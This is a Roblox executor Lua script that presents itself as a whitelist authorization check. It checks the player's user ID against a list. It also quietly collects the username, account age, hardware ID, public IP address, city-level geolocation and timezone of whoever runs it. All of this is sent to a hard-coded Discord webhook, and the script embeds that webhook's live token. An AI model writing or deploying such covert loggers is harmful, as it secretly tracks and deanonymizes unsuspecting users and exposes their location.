-- combined.lua
local Players     = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local req = (syn and syn.request)
         or (http and http.request)
         or request
         or http_request

-- Your exact whitelist and blacklist tables
local whitelist = {
    8233300272,
    8252696642,
    1318379910,
    8291504206,
    1415993233,
    8217130396,
    6099966303,
}

local blacklist = {
    87654321,
}

local function contains(t, val)
    for _, v in ipairs(t) do
        if v == val then return true end
    end
    return false
end

local myId = LocalPlayer.UserId

local status, authorized
if contains(blacklist, myId) then
    status, authorized = "Banned", false
elseif contains(whitelist, myId) then
    status, authorized = "Authorized", true
else
    status, authorized = "Not authorized", false
end

-- Detector functions
local function detectHWID()
    if getgenv and getgenv().gethwid then return getgenv().gethwid() end
    if syn and syn.getexecutorinfo then
        local t = syn.getexecutorinfo()
        return tostring((t and t[1]) or "Unknown")
    end
    return "hwid_"..HttpService:GenerateGUID(false)
end

local function detectIP()
    local ok, r = pcall(function()
        return HttpService:GetAsync("https://api.ipify.org")
    end)
    return (ok and r) or "Unknown"
end

local function detectGeo(ip)
    local ok, r = pcall(function()
        return HttpService:GetAsync("https://ipinfo.io/"..ip.."/json")
    end)
    if ok and r then
        local info = HttpService:JSONDecode(r)
        return string.format("%s, %s, %s",
            info.city or "?", info.region or "?", info.country or "?")
    end
    return "Unknown"
end

local function detectTimezone()
    local z = os.date("%Z") or "Unknown"
    local off = os.date("%z") or ""
    return z.." (UTC"..off..")"
end

local ip       = detectIP()
local geo      = detectGeo(ip)
local hwid     = detectHWID()
local timezone = detectTimezone()

local payload = {
    content = "",
    embeds = {{
        title  = "User Executed Script",
        color  = 0xFFFFFF,
        fields = {
            {name="Username",     value=LocalPlayer.Name, inline=true},
            {name="Display Name", value=LocalPlayer.DisplayName or "N/A", inline=true},
            {name="User ID",      value=tostring(myId), inline=true},
            {name="Account Age",  value=tostring(LocalPlayer.AccountAge).." days", inline=true},
            {name="Profile",      value="https://www.roblox.com/users/"..myId.."/profile", inline=false},
            {name="HWID",         value=hwid, inline=false},
            {name="Public IP",    value=ip, inline=false},
            {name="Geo Loc",      value=geo, inline=false},
            {name="Timezone",     value=timezone, inline=false},
            {name="Auth Status",  value=status, inline=false},
        }
    }}
}

if req then
    pcall(function()
        req({
            Url     = "https://discord.com/api/webhooks/1373375231753982082/9h4YYc8o1imsXBurTKV8NENo8R2fyu-UT9Rqyht-UQ4hkkf4OStqP78RoESfx5-d3yHa",
            Method  = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body    = HttpService:JSONEncode(payload)
        })
    end)
end

return { Authorized = authorized, Reason = status }
